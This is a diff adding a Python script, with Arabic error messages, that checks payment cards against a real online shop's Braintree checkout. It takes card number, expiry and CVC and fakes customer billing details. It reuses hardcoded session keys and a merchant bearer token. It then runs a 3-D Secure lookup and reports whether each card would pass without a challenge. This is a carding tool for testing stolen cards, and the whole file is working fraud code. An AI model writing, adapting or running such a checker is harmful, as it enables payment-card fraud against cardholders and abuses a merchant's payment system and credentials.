@@ -1,0 +1,508 @@
+import os
+
+try:
+    import pyfiglet, webbrowser, user_agent, time
+    import requests
+    import re
+    import base64
+    import random
+    import string
+    
+except ImportError as e:
+    print("حدث خطأ في استدعاء مكتبة:", e)
+    print("يتم تثبيت المكتبات...")
+    os.system('pip install pyfiglet user_agent requests')
+    import pyfiglet
+    import webbrowser
+    import user_agent
+    import time
+    import requests
+    import re
+    import base64
+    import random
+    import string
+    import requests
+def vbv(ccx):
+	import requests,re,base64,jwt,json
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r=requests.session()
+	headers = {
+	    'accept': '*/*',
+	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://shop.acumedic.com',
+	    'phpr-event-handler': 'ev{onHandleRequest}',
+	    'phpr-postback': '1',
+	    'phpr-remote-event': '1',
+	    'priority': 'u=1, i',
+	    'referer': 'https://shop.acumedic.com/product/cup-gl4/',
+	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+	    'sec-ch-ua-mobile': '?0',
+	    'sec-ch-ua-platform': '"Windows"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	data = {
+	    'cms_handler_name': 'shop:on_addToCart',
+	    'ls_session_key': 'lsk6701abdc71e6b7.93568161',
+	    'product_cart_quantity': '1',
+	    'product_id': '143',
+	}
+	
+	response = r.post('https://shop.acumedic.com/product/cup-gl4/', cookies=r.cookies, headers=headers, data=data)
+	headers = {
+	    'authority': 'shop.acumedic.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'cache-control': 'max-age=0',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	response = r.get('https://shop.acumedic.com/checkout/%7ccheckout%7cbegin/', cookies=r.cookies, headers=headers,
+ verify=False)
+	headers = {
+	    'authority': 'shop.acumedic.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://shop.acumedic.com',
+	    'phpr-event-handler': 'ev{onHandleRequest}',
+	    'phpr-postback': '1',
+	    'phpr-remote-event': '1',
+	    'referer': 'https://shop.acumedic.com/checkout/%7ccheckout%7cbegin/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+
+	data = {
+	    'cms_handler_name': 'on_action',
+	    'ls_session_key': 'lsk67185e0660c759.63398947',
+	    'x_custaccgen_salutation': 'Miss',
+	    'first_name': 'fargeshc',
+	    'last_name': 'sjsv',
+	    'phone': '13317430812',
+	    'company': 'wgywg',
+	    'street_address': '32 gavac',
+	    'city': 'new yorkv',
+	    'zip': '10080',
+	    'country': '1',
+	    'state': '37',
+	    'checkout__input--step-number': '1',
+	    'checkout_step': 'billing_info',
+	    'auto_skip_shipping': '1',
+	    'register_customer': '1',
+	    'customer_auto_login': '1',
+	    'customer_registration_notification': '1',
+	    'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
+	}
+	
+	response = r.post('https://shop.acumedic.com/checkout/', cookies=r.cookies, headers=headers, data=data)
+	headers = {
+	    'authority': 'shop.acumedic.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://shop.acumedic.com',
+	    'phpr-event-handler': 'ev{onHandleRequest}',
+	    'phpr-postback': '1',
+	    'phpr-remote-event': '1',
+	    'referer': 'https://shop.acumedic.com/checkout/2/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+
+	data = {
+	    'cms_handler_name': 'on_action',
+	    'ls_session_key': 'lsk67185e0660c759.63398947',
+	    'first_name': 'fargeshc',
+	    'last_name': 'mohhamed',
+	    'phone': '13317430812',
+	    'company': 'wgywg',
+	    'street_address': '32 gavaf',
+	    'city': 'new yorkv',
+	    'zip': '10080',
+	    'country': '17',
+	    'state': '2195',
+	    'checkout__input--step-number': '2',
+	    'checkout_step': 'shipping_info',
+	    'auto_skip_shipping': '1',
+	    'register_customer': '1',
+	    'customer_auto_login': '1',
+	    'customer_registration_notification': '1',
+	    'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
+	}
+
+	response = r.post('https://shop.acumedic.com/checkout', cookies=r.cookies, headers=headers, data=data)
+	headers = {
+	    'accept': '*/*',
+	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://shop.acumedic.com',
+	    'phpr-event-handler': 'ev{onHandleRequest}',
+	    'phpr-postback': '1',
+	    'phpr-remote-event': '1',
+	    'priority': 'u=1, i',
+	    'referer': 'https://shop.acumedic.com/checkout/3/',
+	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+	    'sec-ch-ua-mobile': '?0',
+	    'sec-ch-ua-platform': '"Windows"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	data = {
+	    'cms_handler_name': 'on_action',
+	    'ls_session_key': 'lsk6701ac1d9d8199.25515574',
+	    'shipping_option': '44_7a3074fcf359c7dd8e12787ff21d8bd8',
+	    'customer_notes': '',
+	    'checkout__input--step-number': '3',
+	    'checkout_step': 'shipping_method',
+	    'auto_skip_shipping': '1',
+	    'register_customer': '1',
+	    'customer_auto_login': '1',
+	    'customer_registration_notification': '1',
+	    'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
+	}
+	
+	response = r.post('https://shop.acumedic.com/checkout', cookies=r.cookies, headers=headers, data=data)
+	no = (re.search(r'name="client_token" value="(.*?)"', response.text).group(1))
+	encoded_text = no
+	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
+	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
+	import requests
+	headers = {
+		    'authority': 'payments.braintree-api.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk3MzcwMTksImp0aSI6IjhlNDM1ZjM0LTg5YjItNDMxMi1iYjRjLWU3MzkwNjM4YzU2NyIsInN1YiI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRvbmFjdW1lZGljY29tIn19.dWOIpxFqgEIUMIs1b-ThvjlDHIFyQeOttOn7mmwCpc5TaH8_n1HeMt5nHrW-YlFfgNcgG6VvA94DFf74S01zvQ',
+	    'braintree-version': '2018-05-10',
+	    'content-type': 'application/json',
+	    'origin': 'https://shop.acumedic.com',
+	    'referer': 'https://shop.acumedic.com/checkout/4/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}	
+	json_data = {
+	    'clientSdkMetadata': {
+	        'source': 'client',
+	        'integration': 'custom',
+	        'sessionId': '5177cefc-dfac-4fd6-8d08-0f3ec2775fca',
+	    },
+	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
+	    'operationName': 'ClientConfiguration',
+	}
+	
+	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
+	import requests
+	headers = {
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/json;charset=UTF-8',
+	    'origin': 'https://shop.acumedic.com',
+	    'referer': 'https://shop.acumedic.com/checkout/4/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'x-cardinal-tid': 'Tid-8b5cbd85-3c74-46d1-b5f7-6566a4f5ec4d',
+	}
+	
+	json_data = {
+	    'BrowserPayload': {
+	        'Order': {
+	            'OrderDetails': {},
+	            'Consumer': {
+	                'BillingAddress': {},
+	                'ShippingAddress': {},
+	                'Account': {},
+	            },
+	            'Cart': [],
+	            'Token': {},
+	            'Authorization': {},
+	            'Options': {},
+	            'CCAExtension': {},
+	        },
+	        'SupportsAlternativePayments': {
+	            'cca': True,
+	            'hostedFields': False,
+	            'applepay': False,
+	            'discoverwallet': False,
+	            'wallet': False,
+	            'paypal': False,
+	            'visacheckout': False,
+	        },
+	    },
+	    'Client': {
+	        'Agent': 'SongbirdJS',
+	        'Version': '1.35.0',
+	    },
+	    'ConsumerSessionId': '1_48d374bc-900d-4e2b-9df5-5b0a4b03438f',
+	    'ServerJWT': cardnal,
+	}
+	
+	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
+	payload = response.json()['CardinalJWT']
+	payload_dict = jwt.decode(payload, options={"verify_signature": False})
+	reference_id = payload_dict['ReferenceId']
+	import requests
+	headers = {
+	    'authority': 'geo.cardinalcommerce.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/json',
+	    'origin': 'https://geo.cardinalcommerce.com',
+	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8a9893adb1562e003c26a6&tmEventType=PAYMENT&referenceId=1_48d374bc-900d-4e2b-9df5-5b0a4b03438f&geolocation=false&origin=Songbird',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	json_data = {
+	    'Cookies': {
+	        'Legacy': True,
+	        'LocalStorage': True,
+	        'SessionStorage': True,
+	    },
+	    'DeviceChannel': 'Browser',
+	    'Extended': {
+	        'Browser': {
+	            'Adblock': True,
+	            'AvailableJsFonts': [],
+	            'DoNotTrack': 'unknown',
+	            'JavaEnabled': False,
+	        },
+	        'Device': {
+	            'ColorDepth': 24,
+	            'Cpu': 'unknown',
+	            'Platform': 'Linux armv81',
+	            'TouchSupport': {
+	                'MaxTouchPoints': 5,
+	                'OnTouchStartAvailable': True,
+	                'TouchEventCreationSuccessful': True,
+	            },
+	        },
+	    },
+	    'Fingerprint': 'fb9e8daf8e3249953e6c5f7f28243a04',
+	    'FingerprintingTime': 693,
+	    'FingerprintDetails': {
+	        'Version': '1.5.1',
+	    },
+	    'Language': 'ar-AE',
+	    'Latitude': None,
+	    'Longitude': None,
+	    'OrgUnitId': '5c8a9893adb1562e003c26a6',
+	    'Origin': 'Songbird',
+	    'Plugins': [],
+	    'ReferenceId': reference_id,
+	    'Referrer': 'https://shop.acumedic.com/checkout/4/',
+	    'Screen': {
+	        'FakedResolution': False,
+	        'Ratio': 2.2239583333333335,
+	        'Resolution': '854x384',
+	        'UsableResolution': '854x384',
+	        'CCAScreenSize': '01',
+	    },
+	    'CallSignEnabled': None,
+	    'ThreatMetrixEnabled': False,
+	    'ThreatMetrixEventType': 'PAYMENT',
+	    'ThreatMetrixAlias': 'Default',
+	    'TimeOffset': -180,
+	    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'UserAgentDetails': {
+	        'FakedOS': False,
+	        'FakedBrowser': False,
+	    },
+	    'BinSessionId': '1a3e2b37-f0dc-4979-a8ab-c61d04d78fca',
+	}
+
+	response = r.post(
+	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
+	    cookies=r.cookies,
+	    headers=headers,
+	    json=json_data,
+	)
+	import requests
+	headers = {
+	    'authority': 'payments.braintree-api.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk3MzcwMTksImp0aSI6IjhlNDM1ZjM0LTg5YjItNDMxMi1iYjRjLWU3MzkwNjM4YzU2NyIsInN1YiI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRvbmFjdW1lZGljY29tIn19.dWOIpxFqgEIUMIs1b-ThvjlDHIFyQeOttOn7mmwCpc5TaH8_n1HeMt5nHrW-YlFfgNcgG6VvA94DFf74S01zvQ',
+	    'braintree-version': '2018-05-10',
+	    'content-type': 'application/json',
+	    'origin': 'https://assets.braintreegateway.com',
+	    'referer': 'https://assets.braintreegateway.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+
+	json_data = {
+	    'clientSdkMetadata': {
+	        'source': 'client',
+	        'integration': 'dropin2',
+	        'sessionId': '5177cefc-dfac-4fd6-8d08-0f3ec2775fca',
+	    },
+	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+	    'variables': {
+	        'input': {
+	            'creditCard': {
+	                'number': n,
+	                'expirationMonth': mm,
+	                'expirationYear': yy,
+	                'cvv': cvc,
+	            },
+	            'options': {
+	                'validate': False,
+	            },
+	        },
+	    },
+	    'operationName': 'TokenizeCreditCard',
+	}
+	
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	tok = response.json()['data']['tokenizeCreditCard']['token']
+	import requests
+	headers = {
+	    'authority': 'api.braintreegateway.com',
+	    'accept': '*/*',
+	    'accept-language': 'ar-AE,ar-EG;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/json',
+	    'origin': 'https://shop.acumedic.com',
+	    'referer': 'https://shop.acumedic.com/checkout/4/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'amount': '28.28',
+	    'browserColorDepth': 24,
+	    'browserJavaEnabled': False,
+	    'browserJavascriptEnabled': True,
+	    'browserLanguage': 'ar',
+	    'browserScreenHeight': 854,
+	    'browserScreenWidth': 384,
+	    'browserTimeZone': -180,
+	    'deviceChannel': 'Browser',
+	    'additionalInfo': {
+	        'workPhoneNumber': None,
+	        'shippingGivenName': 'fargeshc',
+	        'shippingSurname': 'fargeshc',
+	        'shippingPhone': '13317430812',
+	        'acsWindowSize': '03',
+	        'billingLine1': '32 gavac',
+	        'billingLine2': None,
+	        'billingCity': 'new yorkv',
+	        'billingState': 'NY',
+	        'billingPostalCode': '10080',
+	        'billingCountryCode': 'US',
+	        'billingPhoneNumber': '+13317430812',
+	        'billingGivenName': 'fargeshc',
+	        'billingSurname': 'sjsv',
+	        'shippingLine1': '32 gavaf',
+	        'shippingLine2': None,
+	        'shippingCity': 'new yorkv',
+	        'shippingState': 'GB-ENG',
+	        'shippingPostalCode': '10080',
+	        'shippingCountryCode': 'GB',
+	        'email': 'hddbccvdu@gmail.com',
+	    },
+	    'bin': '535487',
+	    'dfReferenceId': '1_48d374bc-900d-4e2b-9df5-5b0a4b03438f',
+	    'clientMetadata': {
+	        'requestedThreeDSecureVersion': '2',
+	        'sdkVersion': 'web/3.99.0',
+	        'cardinalDeviceDataCollectionTimeElapsed': 334,
+	        'issuerDeviceDataCollectionTimeElapsed': 3984,
+	        'issuerDeviceDataCollectionResult': True,
+	    },
+	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjk3MzcwMTksImp0aSI6IjhlNDM1ZjM0LTg5YjItNDMxMi1iYjRjLWU3MzkwNjM4YzU2NyIsInN1YiI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1zZjVyZjVtZzVmM3k2ZnkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRvbmFjdW1lZGljY29tIn19.dWOIpxFqgEIUMIs1b-ThvjlDHIFyQeOttOn7mmwCpc5TaH8_n1HeMt5nHrW-YlFfgNcgG6VvA94DFf74S01zvQ',
+	    'braintreeLibraryVersion': 'braintree/web/3.99.0',
+	    '_meta': {
+	        'merchantAppId': 'shop.acumedic.com',
+	        'platform': 'web',
+	        'sdkVersion': '3.99.0',
+	        'source': 'client',
+	        'integration': 'custom',
+	        'integrationType': 'custom',
+	        'sessionId': '5177cefc-dfac-4fd6-8d08-0f3ec2775fca',
+	    },
+	}
+	
+	response = requests.post(
+	    f'https://api.braintreegateway.com/merchants/msf5rf5mg5f3y6fy/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
+	    headers=headers,
+	    json=json_data,
+	)
+	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
+	
+	if 'authenticate_successful' in vbv:
+	       return '3DS Authenticate Successful ✅ '
+	elif 'challenge_required' in vbv:
+	       return '3DS Challenge Required ❌'
+	elif 'authenticate_attempt_successful' in vbv:
+	       return '3DS Authenticate Attempt Successful ✅'
+	elif 'authenticate_rejected' in vbv:
+	       return '3DS Authenticate Rejected ❌'
+	elif 'authenticate_frictionless_failed' in vbv:
+	       return '3DS Authenticate Frictionless Failed ❌'
+	elif 'lookup_card_error' in vbv:
+	       return 'lookup_card_error ⚠️'
+	elif 'lookup_error' in vbv:
+	       return 'Unknown Error ⚠️'
+	return vbv
